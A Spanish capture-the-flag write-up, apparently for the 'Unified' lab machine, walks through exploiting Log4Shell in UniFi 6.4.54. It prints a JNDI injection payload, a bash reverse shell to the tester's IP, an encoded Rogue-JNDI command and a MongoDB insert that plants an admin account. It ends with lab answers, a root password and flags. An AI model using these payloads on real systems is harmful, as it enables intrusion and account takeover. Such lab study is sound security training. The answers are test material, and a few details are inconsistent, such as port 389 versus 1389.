# Unified

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
*   **Tags:**&#x20;

    • **Vulnerability Assessment**: Evaluación sistemática para identificar y clasificar vulnerabilidades en sistemas, aplicaciones o redes.

    • **Databases**: Repositorios estructurados de datos que pueden ser vulnerables a ataques como inyección de código o acceso no autorizado.

    • **Custom Applications**: Aplicaciones desarrolladas a medida que pueden contener vulnerabilidades específicas no presentes en aplicaciones comerciales.

    • **MongoDB**: Sistema de gestión de bases de datos NoSQL que puede ser vulnerable a inyecciones de código o configuraciones inseguras que expongan datos.

    • **Java**: Lenguaje de programación que puede tener vulnerabilidades de seguridad en el código, como inyecciones, malas prácticas de gestión de memoria, entre otras.

    • **Reconnaissance**: Proceso de recolección de información sobre un objetivo para identificar posibles puntos de ataque, mediante técnicas como el escaneo de puertos o el análisis de redes.

    • **Clear Text Credentials**: Exposición de credenciales sin cifrado, lo que facilita su robo durante la transmisión o el almacenamiento.

    • **Default Credentials**: Uso de credenciales por defecto en sistemas o aplicaciones, lo que puede permitir el acceso no autorizado.

    • **Code Injection**: Inserción de código malicioso en una aplicación con el fin de manipular su comportamiento o extraer información.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.125.236
```

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sC -Pn 10.129.125.236
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el **puerto 22** perteneciente al **servicio SSH**, el **puerto 6789** correspondiente a **IBM DB2 Admin**, el **puerto 8080** relacionado con **HTTP Proxy**, y el **puerto 8443** perteneciente a **HTTPS-alt** están abiertos. A continuación, se indagará más sobre estos servicios.

> **Nota**: añadir la IP con unified.htb en el archivo /etc/hosts

<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>

Nos redirige a la página de inicio de sesión de Unifi, versión 6.4.54. Vamos a buscar en Google ese número de versión para ver si existen vulnerabilidades. Vemos que esta versión es vulnerable a la famosa vulnerabilidad de Log4j con el número de CVE **CVE-2021-44228**. Encontramos este [artículo](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) que será nuestra guía para explotar esta vulnerabilidad y obtener una shell reversa.

**Pasos para Explotar la Vulnerabilidad**

1.  **Interceptar la Solicitud de Inicio de Sesión**

    Primero, interceptamos una solicitud de inicio de sesión usando Burp Suite y la enviamos al Repeater.
2.  **Análisis de la Solicitud**

    En la solicitud POST, vemos 4 claves: `username`, `password`, `rememberme` y `strict`.

    Según el artículo, la vulnerabilidad está en el valor de `rememberme` emitido en la solicitud de inicio de sesión.

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Para probar la vulnerabilidad, podemos usar `tcpdump` para escuchar conexiones en el puerto 1389 en la interfaz `tun0`, que es nuestra conexión VPN. Ejecuta el siguiente comando:

```bash
sudo tcpdump -i tun0 port 1389
```

La carga útil que utilizaremos es la siguiente: `${jndi:ldap://10.10.16.51:1389/o=tomcat}`. Colócala en el valor de `rememberme`.

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

Primero, necesitamos clonar el repositorio de GitHub y construir la herramienta. Ejecuta los siguientes comandos:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

Necesitamos una carga útil que nos envíe una shell reversa. Utilizaremos el siguiente comando:

```bash
bash -c 'bash -i >&/dev/tcp/10.10.16.51/4444 0>&1'
```

Luego, debemos codificar esta carga útil en base64 con el siguiente comando:

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.16.51/4444 0>&1' | base64
```

Ahora, necesitamos iniciar el servidor LDAP Rogue-JNDI con el siguiente comando. Reemplaza la cadena codificada en base64 después de `echo` con la que generaste. También reemplaza el valor de `--hostname` con tu dirección IP:

```bash
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTAvNDQ0NCAwPiYxCg}|{base64,-d}|{bash,-i}" --hostname "10.10.16.51"
```

<figure><img src="../../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

Enviamos un request del Repeater y nos ponemos en escucha para conectarnos.

<figure><img src="../../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

Mejoramos la shell.

```bash
script /dev/null -c bash
```

<figure><img src="../../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

Este artículo nos ha ayudado a seguir los pasos necesarios para explotar la vulnerabilidad:[**Gist de AmazingTurtle: Exploitando Log4j en Unifi**](https://gist.github.com/AmazingTurtle/e8a68a0cbe501bae15343aacbf42a1d8) Este recurso proporciona una guía adicional y ejemplos sobre cómo llevar a cabo el ataque y obtener acceso no autorizado.

```bash
mongo --port 27117 ace
db.admin.find().forEach(printjson); 
```

<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

Creamos un hash del tipo sha-512 para un nuevo usuario.

<figure><img src="../../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

```bash
db.admin.insert({ 
  "email" : "null@localhost.local", 
  "last_site_name" : "default", 
  "name" : "unifi-admin", 
  "time_created" : NumberLong(100019800), 
  "x_shadow" : "$6$CY5RIB3Bks3FzoJd$9WH9lP48kbNAOuNTeOEWNWpbTHVDRZyaL9Sh1j1U/qwC4xRlvVvPKGyE1/Pqi1Z5Tuukeob9em9YJaa8B8HJX." 
});
```

Nos logueamos con las credenciales.

<figure><img src="../../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Dado que el recurso actual no está cargando, revisamos el walkthrough oficial para obtener la contraseña. Según el documento oficial, la contraseña es: **NotACrackablePassword4U2022**.

<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

Obtenemos las distintas flag requeridas entre los directorios.

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### **Tarea 1:** ¿Cuáles son los primeros cuatro puertos abiertos?

**22, 6789, 8080, 8443**\
Estos son los puertos abiertos que identificamos en el escaneo de red.

#### **Tarea 2:** ¿Cuál es el título del software que se está ejecutando en el puerto 8443?

**UniFi Network**\
El software en ejecución en el puerto 8443 es UniFi Network.

#### **Tarea 3:** ¿Cuál es la versión del software que se está ejecutando?

**6.4.54**\
La versión del software UniFi Network en ejecución es 6.4.54.

#### **Tarea 4:** ¿Cuál es el CVE para la vulnerabilidad identificada?

**CVE-2021-44228**\
La vulnerabilidad identificada en la versión del software corresponde al CVE-2021-44228.

#### **Tarea 5:** ¿Qué protocolo utiliza JNDI en la inyección?

**ldap**\
JNDI utiliza el protocolo LDAP para la inyección.

#### **Tarea 6:** ¿Qué herramienta usamos para interceptar el tráfico, indicando que el ataque fue exitoso?

**tcpdump**\
La herramienta utilizada para interceptar el tráfico y confirmar el éxito del ataque es tcpdump.

#### **Tarea 7:** ¿En qué puerto necesitamos inspeccionar el tráfico interceptado?

**389**\
Debemos inspeccionar el tráfico interceptado en el puerto 389.

#### **Tarea 8:** ¿En qué puerto está en funcionamiento el servicio MongoDB?

**27117**\
El servicio MongoDB está en funcionamiento en el puerto 27117.

#### **Tarea 9:** ¿Cuál es el nombre de la base de datos por defecto para las aplicaciones UniFi?

**ace**\
La base de datos por defecto para las aplicaciones UniFi se llama ace.

#### **Tarea 10:** ¿Qué función usamos para enumerar usuarios dentro de la base de datos en MongoDB?

**db.admin.find()**\
Para enumerar usuarios dentro de la base de datos en MongoDB usamos la función db.admin.find().

#### **Tarea 11:** ¿Qué función usamos para actualizar usuarios dentro de la base de datos en MongoDB?

**db.admin.update()**\
La función utilizada para actualizar usuarios dentro de la base de datos en MongoDB es db.admin.update().

#### **Tarea 12:** ¿Cuál es la contraseña para el usuario root?

**NotACrackablePassword4U2022**\
La contraseña para el usuario root es NotACrackablePassword4U2022.

#### Tarea 13: Enviar Bandera Usuario

6ced1a6a89e666c0620cdb10262ba127

#### Tarea 14: Enviar Bandera Root

e50bc93c75b634e4b272d2f771c33681
